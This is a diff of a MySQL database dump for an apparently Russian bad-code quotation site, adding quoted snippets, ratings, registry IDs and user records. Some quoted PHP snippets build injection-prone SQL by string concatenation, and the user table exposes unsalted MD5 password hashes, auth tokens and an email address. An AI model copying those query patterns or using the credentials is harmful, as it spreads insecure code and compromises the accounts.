   (338,2244,5,1231260535,0,'#-*- coding:cp1251 -*-\r\nfrom Tkinter import *\r\n\"\"\" pyCalc by deluxe, thanks to Sanch0\r\nКалькулятор работает только с 2 числами и одним действием над ними.\"\"\"\r\n# глобальные переменные\r\nx1=''''\r\nx2=''''\r\ndeistvie=''''\r\n# функции батонов ввода цифр и запятой\r\n# если действие еще не задано, заполняется х1, а если задано - х2\r\n# и значение переменной отражается на соотв. виджете\r\ndef press1():  \r\n\tglobal x1, deistvie, x2\r\n\tif deistvie=='''': \r\n\t\tx1=x1+''1''\r\n\t\tlblx1.configure(text=x1)\r\n\telse: \r\n\t\tx2=x2+''1''\r\n\t\tlblx2.configure(text=x2)\r\ndef press2():\r\n\tglobal x1, deistvie, x2\r\n\tif deistvie=='''': \r\n\t\tx1=x1+''2''\r\n\t\tlblx1.configure(text=x1)\r\n\telse: \r\n\t\tx2=x2+''2''\r\n\t\tlblx2.configure(text=x2)\r\ndef press3():\r\n\tglobal x1, deistvie, x2\r\n\tif deistvie=='''': \r\n\t\tx1=x1+''3''\r\n\t\tlblx1.configure(text=x1)\r\n\telse: \r\n\t\tx2=x2+''3''\r\n\t\tlblx2.configure(text=x2)\r\ndef press4():\r\n\tglobal x1, deistvie, x2\r\n\tif deistvie=='''': \r\n\t\tx1=x1+''4''\r\n\t\tlblx1.configure(text=x1)\r\n\telse: \r\n\t\tx2=x2+''4''\r\n\t\tlblx2.configure(text=x2)\r\ndef press5():\r\n\tglobal x1, deistvie, x2\r\n\tif deistvie=='''': \r\n\t\tx1=x1+''5''\r\n\t\tlblx1.configure(text=x1)\r\n\telse: \r\n\t\tx2=x2+''5''\r\n\t\tlblx2.configure(text=x2)\r\ndef press6():\r\n\tglobal x1, deistvie, x2\r\n\tif deistvie=='''': \r\n\t\tx1=x1+''6''\r\n\t\tlblx1.configure(text=x1)\r\n\telse: \r\n\t\tx2=x2+''6''\r\n\t\tlblx2.configure(text=x2)\r\ndef press7():\r\n\tglobal x1, deistvie, x2\r\n\tif deistvie=='''': \r\n\t\tx1=x1+''7''\r\n\t\tlblx1.configure(text=x1)\r\n\telse: \r\n\t\tx2=x2+''7''\r\n\t\tlblx2.configure(text=x2)\r\ndef press8():\r\n\tglobal x1, deistvie, x2\r\n\tif deistvie=='''': \r\n\t\tx1=x1+''8''\r\n\t\tlblx1.configure(text=x1)\r\n\telse: \r\n\t\tx2=x2+''8''\r\n\t\tlblx2.configure(text=x2)\r\ndef press9():\r\n\tglobal x1, deistvie, x2\r\n\tif deistvie=='''': \r\n\t\tx1=x1+''9''\r\n\t\tlblx1.configure(text=x1)\r\n\telse: \r\n\t\tx2=x2+''9''\r\n\t\tlblx2.configure(text=x2)\r\ndef press0():\r\n\tglobal x1, deistvie, x2\r\n\tif deistvie=='''': \r\n\t\tx1=x1+''0''\r\n\t\tlblx1.configure(text=x1)\r\n\telse: \r\n\t\tx2=x2+''0''\r\n\t\tlblx2.configure(text=x2)\r\ndef pressdot():\r\n\tglobal x1, deistvie, x2\r\n\tif deistvie=='''': \r\n\t\tx1=x1+''.''\r\n\t\tlblx1.configure(text=x1)\r\n\telse: \r\n\t\tx2=x2+''.''\r\n\t\tlblx2.configure(text=x2)','','',11,0,1,0),
   (339,2249,1,1231274985,0,'function show_admin_skin_file($skin_file)\r\n{\r\n//Общие переменные\r\nglobal $yes, $no, $admin, $errors, $page, $messages, $i;\r\n\r\n//Переменные раздела ''Статус''\r\nglobal $admin_skin, $guest_skin, $gb_title, $gb_description, $admin_skin_title, $admin_skin_author, $guest_skin_title, $guest_skin_author;\r\nglobal $is_readable_data, $is_writable_data, $is_readable_blocked_ip, $is_writable_blocked_ip, $is_readable_config, $is_writable_config, $is_readable_time, $is_writable_time;\r\nglobal $opened_or_closed, $messages, $data_size, $users, $smiles;\r\n\r\n//Переменные раздела ''Управление гостевой''\r\nglobal $smiles, $name, $city, $email, $url, $icq, $msg, $msg_number, $time, $mod_time, $ip, $if_blocked, $info, $answer, $mod_current_time;\r\n\r\n//Переменные раздела ''Настройки''\r\nglobal $current_time, $guest_skin_list, $admin_skin_list, $opened_or_closed_button, $close_button, $open_button, $site_title, $site_keywords, $site_description, $site_charset, $server_info, $last_msgs_on_top, $last_page_firstly, $max_msgs_per_page, $name_maxlenght, $email_maxlenght, $city_maxlenght, $url_maxlenght, $icq_maxlenght, $msg_maxlenght, $word_maxlenght, $smiles_on_page, $execution_time;\r\n\r\n//Переменные раздела ''Редактирование скина''\r\nglobal $guest_header_file, $guest_msg_file, $guest_footer_file, $guest_errors_file, $error;\r\nglobal $back, $next, $all, $spacer, $no_parametr, $link_next, $link_back, $link_all, $pages;\r\nglobal $is_writable_guest_skin_config, $is_writable_guest_skin_header, $is_writable_guest_skin_msg, $is_writable_guest_skin_footer, $is_writable_guest_skin_errors;\r\n\r\n//Переменные раздела ''Управление временем''\r\nglobal $date_format, $monthes, $wdays, $cookies_life, $def_ip_time, $flood_time;\r\n\r\n//Переменные раздела ''Блоки''\r\nglobal $block_code, $blocked_ip_code, $blocked_ip, $blocked_ip_time, $blocked_ip_date, $cur_status, $ip_num;','','Шаблонизатор гостевой книги',20,0,1,0),
   (340,2252,8,1231281371,1231586740,'private void OnRdbDatesCheckedChanged(object sender, EventArgs e)\r\n{\r\n            if (rdbMonth.Checked)\r\n                MakeDateViewVisible(\"month\");\r\n            else if (rdbQuarter.Checked)\r\n                MakeDateViewVisible(\"quarter\");\r\n            else if (rdbYear.Checked)\r\n                MakeDateViewVisible(\"year\");\r\n            else\r\n                MakeDateViewVisible(\"individual\");\r\n}\r\n\r\nprivate void MakeDateViewVisible(string dateView)\r\n{\r\n            switch (dateView)\r\n            {\r\n                case \"year\":\r\n                    YearView.Visible = true;\r\n                    QuarterView.Visible = false;\r\n                    MonthView.Visible = false;\r\n                    IndividualDatesView.Visible = false;\r\n                    break;\r\n                case \"quarter\":\r\n                    YearView.Visible = false;\r\n                    QuarterView.Visible = true;\r\n                    MonthView.Visible = false;\r\n                    IndividualDatesView.Visible = false;\r\n                    break;\r\n                case \"month\":\r\n                    YearView.Visible = false;\r\n                    QuarterView.Visible = false;\r\n                    MonthView.Visible = true;\r\n                    IndividualDatesView.Visible = false;\r\n                    break;\r\n                case \"individual\":\r\n                    YearView.Visible = false;\r\n                    QuarterView.Visible = false;\r\n                    MonthView.Visible = false;\r\n                    IndividualDatesView.Visible = true;\r\n                    break;\r\n            }\r\n}','','Зато красиво методы вызываются!',-6,0,0,2),
@@ -717,15 +740,15 @@ INSERT INTO `quoter_quote` (`id`, `obj_id`, `category_id`, `created`, `deleted`,
   (344,2279,6,1231422364,1231507732,'if(True==true && True==false)\r\n   return True;','','нереальное условие',-14,0,0,1),
   (345,2281,1,1231423594,0,'<?\r\n$src = \"q: 1\r\nw: 2\r\ne: 3\";\r\n$res = explode(\"\\r\\n\", $src);\r\n foreach($res as $str) \r\n {\r\n list($parametr, $value) = explode(\": \", $str);\r\n $a[$parametr] = $value;\r\n echo $parametr.\"   \".$a[$parametr].\"\\r\\n\";\r\n?>\r\n }','','temp',1,0,1,2),
   (346,2287,1,1231435915,1237038719,'public function rsort($flag = SORT_REGULAR) \r\n{\r\n  rsort($this->var, SORT_REGULAR);\r\n  return $this;\r\n}','','Пример сортировки массива =)',-1,0,1,0),
-  (347,2293,1,1231438002,0,'function newuser($username){\r\n  return;\r\n  /*\r\n    ДВАДЦАТЬ СТРОК КОДА\r\n  */\r\n  //не пойму почему не работает:ФИО Программиста\r\n}','','наследие от предыдущих программистов проекта',17,0,1,1),
+  (347,2293,1,1231438002,0,'function newuser($username){\r\n  return;\r\n  /*\r\n    ДВАДЦАТЬ СТРОК КОДА\r\n  */\r\n  //не пойму почему не работает:ФИО Программиста\r\n}','','наследие от предыдущих программистов проекта',17,0,1,0),
   (348,2296,1,1231486629,1231598466,'public function buildCriteria($table, $conditions)\r\n    {\r\n        $source_table = $table->getTableName();\r\n        $criteria = new criteria($source_table, ''keyword'');\r\n\r\n        foreach ($conditions as $field => $conds) {\r\n\r\n\r\n            if (is_array($conds)) {\r\n\r\n                if (isset($conds[''plus''])) {\r\n                    $word = array_shift($conds[''plus'']);\r\n                    $like_criterion = new criterion($field, ''%'' . $word . ''%'', criteria::LIKE);\r\n                    foreach ($conds[''plus''] as $word) {\r\n                        $like_criterion->addOr(new criterion($field, ''%'' . $word . ''%'', criteria::LIKE));\r\n                    }\r\n                }\r\n\r\n                if (isset($conds[''minus''])) {\r\n                    $word = array_shift($conds[''minus'']);\r\n                    $not_like_criterion = new criterion($field, ''%'' . $word . ''%'', criteria::NOT_LIKE);\r\n                    foreach ($conds[''minus''] as $word) {\r\n                        $not_like_criterion->addAnd(new criterion($field, ''%'' . $word . ''%'', criteria::NOT_LIKE));\r\n                    }\r\n                }\r\n\r\n                if (isset($conds[''less''])) {\r\n                    if (!is_array($conds[''less''])) {\r\n                        $conds[''less''] = array($conds[''less'']);\r\n                    }\r\n\r\n                    $word = array_shift($conds[''less'']);\r\n                    $less_criterion = new criterion($field, $word, criteria::LESS);\r\n\r\n                    foreach ($conds[''less''] as $word) {\r\n                        $less_criterion->addAnd(new criterion($field, $word, criteria::LESS));\r\n                    }\r\n                }\r\n\r\n                if (isset($conds[''less_eq''])) {\r\n                    if (!is_array($conds[''less_eq''])) {\r\n                        $conds[''less_eq''] = array($conds[''less_eq'']);\r\n                    }\r\n\r\n                    $word = array_shift($conds[''less_eq'']);\r\n                    $less_eq_criterion = new criterion($field, $word, criteria::LESS_EQUAL );\r\n\r\n                    foreach ($conds[''less_eq''] as $word) {\r\n                        $less_eq_criterion->addAnd(new criterion($field, $word, criteria::LESS_EQUAL));\r\n                    }\r\n                }\r\n            }\r\n        }\r\n\r\n        $main_criterion = new criterion();\r\n\r\n        if (!empty($like_criterion)) {\r\n            $main_criterion->add($like_criterion);\r\n            $add_method = ''addAnd'';\r\n        }\r\n\r\n        if (!empty($not_like_criterion)) {\r\n            if (empty($add_method)) {\r\n                $add_method = ''add'';\r\n            }\r\n            $main_criterion->$add_method($not_like_criterion);\r\n        }\r\n\r\n        if (!empty($less_criterion)) {\r\n            if (empty($add_method)) {\r\n                $add_method = ''add'';\r\n            }\r\n            $main_criterion->$add_method($less_criterion);\r\n        }\r\n\r\n        if (!empty($less_eq_criterion)) {\r\n            if (empty($add_method)) {\r\n                $add_method = ''add'';\r\n            }\r\n            $main_criterion->$add_method($less_eq_criterion);\r\n        }\r\n\r\n        $criteria->add($main_criterion);\r\n\r\n        return $criteria;\r\n\r\n    }\r\n\r\n\r\npublic function testBuildCriteria()\r\n    {\r\n        $table = new mockStubKeywordTable();\r\n        $table->setReturnValue(''getTableName'', ''test_table'');\r\n\r\n        $query = $this->keywordQuery;\r\n\r\n        $data[''field1''][''less''] = 5;\r\n        $data[''field2''][''less_eq''] = 10;\r\n/*        $data[''field2''][''greater_eq''] = 11;\r\n        $data[''field3''][''greater''] = 12;','','требуется рефакторинг',-9,0,0,1),
   (349,2298,1,1231487830,0,'<?php\r\n\r\nfunction drop_dir ( $dir_id )\r\n{\r\n\t$query\t=\tmysql_query ( \"SELECT `id` FROM `dirs` WHERE `subid`=\" . $dir_id );\r\n\twhile ( $row\t=\tmysql_fetch_array ( $query ) )\r\n\t{\r\n\t\t$n_query\t=\tmysql_query ( \"SELECT `id` FROM `dirs` WHERE `subid`=\" . $row[''id''] );\r\n\t\twhile ( $n_row\t=\tmysql_fetch_array ( $query ) )\r\n\t\t{\r\n\t\t\t$n2_query\t=\tmysql_query ( \"SELECT `id` FROM `dirs` WHERE `subid`=\" . $n_row[''id''] );\r\n\t\t\twhile ( $n2_row\t=\tmysql_fetch_array ( $n2_query ) )\r\n\t\t\t{\r\n\t\t\t\tmysql_query ( \"DELETE FROM `dirs` WHERE `id`=\" . $n2_row[''id''] );\r\n\t\t\t} // Неужто блядь кто то дальше вложит\r\n\t\t\tmysql_query ( \"DELETE FROM `dirs` WHERE `id`=\" . $n_row[''id''] );\r\n\t\t}\r\n\t\tmysql_query ( \"DELETE FROM `dirs` WHERE `id`=\" . $row[''id''] );\r\n\t}\r\n\tmysql_query ( \"DELETE FROM `dirs` WHERE `id`=\" . $dir );\r\n\tRETURN TRUE;\r\n}\r\n\r\n?>','','(c) Я, 2007',21,0,1,0),
   (350,2303,1,1231501764,0,'if (@mysql_query(\"CREATE TABLE `cms_attributes_\".$a.\"` (`element_id` int(5))\")) {}','','Реальный код..\r\nВидимо, человек любит индусов и начал им подражать)',2,1,1,0),
   (351,2305,1,1231501865,0,'// Проверяет, есть ли у страницы вложенные страницы\r\nfunction exists_sub_pages($page_id)\r\n{\r\n$select_sub_pages=mysql_query(\"select * from pages where parent=''\".$page_id.\"''\");\r\nif (mysql_num_rows($select_sub_pages)>0) {$result=1;} else {$result=0;}\r\nreturn $result;\r\n}','','Не понимаю, зачем так всё усложнять :-(',1,1,1,0),
   (352,2321,6,1231536873,0,'int main()\r\n{\r\nint i;\r\nfor(clrscr(),\r\n    printf(\"starting of stupid progam\\n\"),\r\n    i=10;\r\n    i--;\r\n    printf(\"i= %d\\n\",i));\r\nreturn 0;\r\n\r\n}','','Страшен язык Си',4,0,1,0),
   (353,2323,6,1231536938,0,'int clearscreen()\r\n{\r\nclrscr();\r\nreturn 0;\r\n}\r\nvoid main()\r\n{\r\nchar * c;\r\n\r\nprintf(\"You typed: %c\",\r\n       *c,\r\n       scanf(\"%c\",c),\r\n       printf(\"Type any simbol: \"),\r\n       clearscreen());\r\n\r\n}','','Страшен язык Си 2',10,1,1,0),
-  (354,2330,1,1231575650,0,'/**\r\n     * Validate the word\r\n     *\r\n     * @see    Zend_Validate_Interface::isValid()\r\n     * @param  mixed $value\r\n     * @return boolean\r\n     */\r\n    public function isValid($value, $context = null)\r\n    {\r\n        $name = $this->getName();\r\n        if (!isset($context[$name][''input''])) {\r\n            $this->_error(self::MISSING_VALUE);\r\n            return false;\r\n        }\r\n        $value = strtolower($context[$name][''input'']);\r\n        $this->_setValue($value);\r\n\r\n        if (!isset($context[$name][''id''])) {\r\n            $this->_error(self::MISSING_ID);\r\n            return false;\r\n        }\r\n\r\n        $this->_id = $context[$name][''id''];\r\n        if ($value !== $this->getWord()) {\r\n            $this->_error(self::BAD_CAPTCHA);\r\n            return false;\r\n        }\r\n\r\n        return true;\r\n    }','','не ожидал даже от Zend Framework-а',1,9,1,0),
-  (355,2339,1,1231593160,0,'function is_utf($str){\n    if(iconv(\"UTF-8\",\"UTF-8\",$str)==$str)\n        return true;\n    else\n        return false;\n}','4, 1','utf-8 или нет? :)',24,22,1,5);
+  (354,2330,1,1231575650,0,'/**\r\n     * Validate the word\r\n     *\r\n     * @see    Zend_Validate_Interface::isValid()\r\n     * @param  mixed $value\r\n     * @return boolean\r\n     */\r\n    public function isValid($value, $context = null)\r\n    {\r\n        $name = $this->getName();\r\n        if (!isset($context[$name][''input''])) {\r\n            $this->_error(self::MISSING_VALUE);\r\n            return false;\r\n        }\r\n        $value = strtolower($context[$name][''input'']);\r\n        $this->_setValue($value);\r\n\r\n        if (!isset($context[$name][''id''])) {\r\n            $this->_error(self::MISSING_ID);\r\n            return false;\r\n        }\r\n\r\n        $this->_id = $context[$name][''id''];\r\n        if ($value !== $this->getWord()) {\r\n            $this->_error(self::BAD_CAPTCHA);\r\n            return false;\r\n        }\r\n\r\n        return true;\r\n    }','','не ожидал даже от Zend Framework-а',2,10,1,1),
+  (355,2339,1,1231593160,0,'function is_utf($str){\n    if(iconv(\"UTF-8\",\"UTF-8\",$str)==$str)\n        return true;\n    else\n        return false;\n}','4, 1','utf-8 или нет? :)',27,25,1,6);
 COMMIT;
 
 #
@@ -738,7 +761,8 @@ CREATE TABLE `quoter_quoteCategory` (
   `id` INTEGER(11) NOT NULL AUTO_INCREMENT,
   `obj_id` INTEGER(11) NOT NULL,
   `name` CHAR(50) COLLATE utf8_general_ci NOT NULL DEFAULT '',
-  `highlite_name` CHAR(50) COLLATE utf8_general_ci NOT NULL DEFAULT '',
+  `geshi_alias` CHAR(50) COLLATE utf8_general_ci DEFAULT NULL,
+  `js_alias` CHAR(50) COLLATE utf8_general_ci DEFAULT NULL,
   `title` CHAR(50) COLLATE utf8_general_ci NOT NULL DEFAULT '',
   `quote_counts` INTEGER(10) UNSIGNED NOT NULL,
   PRIMARY KEY (`id`)
@@ -749,20 +773,20 @@ AUTO_INCREMENT=14 ROW_FORMAT=FIXED CHARACTER SET 'utf8' COLLATE 'utf8_general_ci
 # Data for the `quoter_quoteCategory` table  (LIMIT 0,500)
 #
 
-INSERT INTO `quoter_quoteCategory` (`id`, `obj_id`, `name`, `highlite_name`, `title`, `quote_counts`) VALUES 
-  (1,22,'php','php','PHP',95),
-  (2,23,'javascript','javascript','JavaScript',12),
-  (3,34,'sql','sql','SQL',7),
-  (4,35,'perl','perl','PERL',7),
-  (5,36,'python','python','Python',9),
-  (6,738,'c','c','Си',13),
-  (7,739,'cpp','cpp','C++',21),
-  (8,740,'csharp','csharp','C#',22),
-  (9,741,'java','java','Java',20),
-  (10,749,'delphi','delphi','Delphi',11),
-  (11,767,'actionscript3','actionscript3','ActionScript',6),
-  (12,1029,'asm','asm','Assembler',0),
-  (13,1052,'vb','vb','VisualBasic',3);
+INSERT INTO `quoter_quoteCategory` (`id`, `obj_id`, `name`, `geshi_alias`, `js_alias`, `title`, `quote_counts`) VALUES 
+  (1,22,'php','php','php','PHP',95),
+  (2,23,'javascript','javascript','javascript','JavaScript',12),
+  (3,34,'sql','sql','sql','SQL',7),
+  (4,35,'perl','perl','perl','PERL',7),
+  (5,36,'python','python','python','Python',9),
+  (6,738,'c','c','cpp','Си',13),
+  (7,739,'cpp','cpp','cpp','C++',21),
+  (8,740,'csharp','csharp','cs','C#',22),
+  (9,741,'java','java','java','Java',20),
+  (10,749,'delphi','delphi','delphi','Delphi',11),
+  (11,767,'actionscript3','actionscript3','javascript','ActionScript',6),
+  (12,1029,'asm','asm','avrasm','Assembler',0),
+  (13,1052,'vb','vb','vbscript','VisualBasic',3);
 COMMIT;
 
 #
@@ -12890,7 +12914,7 @@ CREATE TABLE `ratings_ratings` (
   KEY `folder_id` (`folder_id`),
   KEY `user_id` (`user_id`)
 )ENGINE=MyISAM
-AUTO_INCREMENT=39 CHARACTER SET 'utf8' COLLATE 'utf8_general_ci';
+AUTO_INCREMENT=51 CHARACTER SET 'utf8' COLLATE 'utf8_general_ci';
 
 #
 # Data for the `ratings_ratings` table  (LIMIT 0,500)
@@ -12934,7 +12958,19 @@ INSERT INTO `ratings_ratings` (`id`, `folder_id`, `user_id`, `created`, `ip_addr
   (35,2,2,1244109565,'127.0.0.1','Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.10) Gecko/2009042316 Firefox/3.0.10',1,3),
   (36,2,1,1244109703,'127.0.0.1','Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727)',1,7),
   (37,1,1,1244109715,'127.0.0.1','Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727)',-1,351),
-  (38,1,1,1244109718,'127.0.0.1','Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727)',1,350);
+  (38,1,1,1244109718,'127.0.0.1','Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727)',1,350),
+  (39,2,8,1245400946,'127.0.0.1','Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.11) Gecko/2009060215 Firefox/3.0.11',1,1),
+  (40,1,8,1245401971,'127.0.0.1','Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.11) Gecko/2009060215 Firefox/3.0.11',1,355),
+  (41,1,8,1245402229,'127.0.0.1','Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.11) Gecko/2009060215 Firefox/3.0.11',1,354),
+  (42,2,8,1245402390,'127.0.0.1','Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.11) Gecko/2009060215 Firefox/3.0.11',1,3),
+  (43,2,8,1245402400,'127.0.0.1','Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.11) Gecko/2009060215 Firefox/3.0.11',-1,6),
+  (44,2,8,1245402586,'127.0.0.1','Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.11) Gecko/2009060215 Firefox/3.0.11',1,8),
+  (45,2,8,1245402826,'127.0.0.1','Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.11) Gecko/2009060215 Firefox/3.0.11',-1,9),
+  (46,1,8,1246441401,'127.0.0.1','Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.11) Gecko/2009060215 Firefox/3.0.11',1,355),
+  (47,1,8,1246528897,'127.0.0.1','Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1) Gecko/20090624 Firefox/3.5',1,355),
+  (48,1,8,1246529250,'127.0.0.1','Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1) Gecko/20090624 Firefox/3.5',1,337),
+  (49,2,8,1246529634,'127.0.0.1','Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1) Gecko/20090624 Firefox/3.5',1,2),
+  (50,1,8,1246534940,'127.0.0.1','Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1) Gecko/20090624 Firefox/3.5',1,326);
 COMMIT;
 
 #
@@ -12996,7 +13032,7 @@ CREATE TABLE `sys_access_registry` (
   `class_id` INTEGER(11) UNSIGNED DEFAULT NULL,
   PRIMARY KEY (`obj_id`)
 )ENGINE=MyISAM
-AUTO_INCREMENT=2623 ROW_FORMAT=FIXED CHARACTER SET 'utf8' COLLATE 'utf8_general_ci';
+AUTO_INCREMENT=2638 ROW_FORMAT=FIXED CHARACTER SET 'utf8' COLLATE 'utf8_general_ci';
 
 #
 # Data for the `sys_access_registry` table  (LIMIT 0,500)
@@ -14888,7 +14924,22 @@ INSERT INTO `sys_access_registry` (`obj_id`, `class_id`) VALUES
   (2619,11),
   (2620,11),
   (2621,11),
-  (2622,11);
+  (2622,11),
+  (2623,11),
+  (2624,11),
+  (2625,11),
+  (2626,11),
+  (2627,11),
+  (2628,11),
+  (2629,11),
+  (2630,11),
+  (2631,11),
+  (2632,11),
+  (2633,11),
+  (2634,11),
+  (2635,11),
+  (2636,11),
+  (2637,11);
 COMMIT;
 
 #
@@ -15440,7 +15491,7 @@ CREATE TABLE `sys_obj_id` (
   `id` INTEGER(11) UNSIGNED NOT NULL AUTO_INCREMENT,
   PRIMARY KEY (`id`)
 )ENGINE=MyISAM
-AUTO_INCREMENT=2623 ROW_FORMAT=FIXED CHARACTER SET 'utf8' COLLATE 'utf8_general_ci';
+AUTO_INCREMENT=2638 ROW_FORMAT=FIXED CHARACTER SET 'utf8' COLLATE 'utf8_general_ci';
 
 #
 # Data for the `sys_obj_id` table  (LIMIT 0,500)
@@ -18103,7 +18154,22 @@ INSERT INTO `sys_obj_id` (`id`) VALUES
   (2619),
   (2620),
   (2621),
-  (2622);
+  (2622),
+  (2623),
+  (2624),
+  (2625),
+  (2626),
+  (2627),
+  (2628),
+  (2629),
+  (2630),
+  (2631),
+  (2632),
+  (2633),
+  (2634),
+  (2635),
+  (2636),
+  (2637);
 COMMIT;
 
 #
@@ -18311,6 +18377,7 @@ CREATE TABLE `user_user` (
   `id` INTEGER(11) NOT NULL AUTO_INCREMENT,
   `obj_id` INTEGER(10) UNSIGNED NOT NULL DEFAULT '0',
   `login` VARCHAR(255) COLLATE utf8_general_ci NOT NULL DEFAULT '',
+  `email` VARCHAR(255) COLLATE utf8_general_ci NOT NULL DEFAULT '',
   `password` VARCHAR(32) COLLATE utf8_general_ci NOT NULL DEFAULT '',
   `created` INTEGER(11) DEFAULT NULL,
   `confirmed` VARCHAR(32) COLLATE utf8_general_ci DEFAULT NULL,
@@ -18321,15 +18388,17 @@ CREATE TABLE `user_user` (
   PRIMARY KEY (`id`),
   KEY `login` (`login`)
 )ENGINE=MyISAM
-AUTO_INCREMENT=7 CHARACTER SET 'utf8' COLLATE 'utf8_general_ci';
+AUTO_INCREMENT=9 CHARACTER SET 'utf8' COLLATE 'utf8_general_ci';
 
 #
 # Data for the `user_user` table  (LIMIT 0,500)
 #
 
-INSERT INTO `user_user` (`id`, `obj_id`, `login`, `password`, `created`, `confirmed`, `last_login`, `language_id`, `timezone`, `skin`) VALUES 
-  (1,17,'guest','',NULL,NULL,1227260702,NULL,3,1),
-  (2,18,'admin','098f6bcd4621d373cade4e832627b4f6',NULL,NULL,1244195480,1,3,1);
+INSERT INTO `user_user` (`id`, `obj_id`, `login`, `email`, `password`, `created`, `confirmed`, `last_login`, `language_id`, `timezone`, `skin`) VALUES 
+  (1,17,'guest','','',NULL,NULL,1227260702,NULL,3,1),
+  (2,18,'admin','','098f6bcd4621d373cade4e832627b4f6',NULL,NULL,1244195480,1,3,1),
+  (7,0,'striker@bk.ru','','62318aca2ef2e809a13623715a8aaff4',1244371612,NULL,1244372360,NULL,3,1),
+  (8,0,'striker','striker@bk.ru','1646184a833905d3135b5415de6bae8d',1245237203,NULL,1245237241,NULL,3,1);
 COMMIT;
 
 #
@@ -18347,7 +18416,7 @@ CREATE TABLE `user_userAuth` (
   `time` INTEGER(11) UNSIGNED DEFAULT NULL,
   PRIMARY KEY (`id`)
 )ENGINE=MyISAM
-AUTO_INCREMENT=22 ROW_FORMAT=FIXED CHARACTER SET 'utf8' COLLATE 'utf8_general_ci';
+AUTO_INCREMENT=25 ROW_FORMAT=FIXED CHARACTER SET 'utf8' COLLATE 'utf8_general_ci';
 
 #
 # Data for the `user_userAuth` table  (LIMIT 0,500)
@@ -18356,7 +18425,8 @@ AUTO_INCREMENT=22 ROW_FORMAT=FIXED CHARACTER SET 'utf8' COLLATE 'utf8_general_ci
 INSERT INTO `user_userAuth` (`id`, `user_id`, `ip`, `hash`, `obj_id`, `time`) VALUES 
   (19,2,'127.0.0.1','c3e234c16087ca58d9ce0a2057c402bd',NULL,NULL),
   (20,2,'127.0.0.1','0bc8b5fc0900dcf33ba30f876929b531',NULL,NULL),
-  (21,2,'127.0.0.1','1b28f40952f72f0104e3304db72179d3',NULL,NULL);
+  (21,2,'127.0.0.1','1b28f40952f72f0104e3304db72179d3',NULL,NULL),
+  (24,8,'127.0.0.1','f081b35da6a58d6bccfc0cd48cba3007',NULL,NULL);
 COMMIT;
 
 #
@@ -18432,7 +18502,15 @@ CREATE TABLE `user_userOpenID` (
   PRIMARY KEY (`id`),
   KEY `user_id` (`user_id`)
 )ENGINE=MyISAM
-AUTO_INCREMENT=1 CHARACTER SET 'utf8' COLLATE 'utf8_general_ci';
+AUTO_INCREMENT=2 CHARACTER SET 'utf8' COLLATE 'utf8_general_ci';
+
+#
+# Data for the `user_userOpenID` table  (LIMIT 0,500)
+#
+
+INSERT INTO `user_userOpenID` (`id`, `user_id`, `openid_url`) VALUES 
+  (1,8,'claimid.com/striker');
+COMMIT;
 
 
 
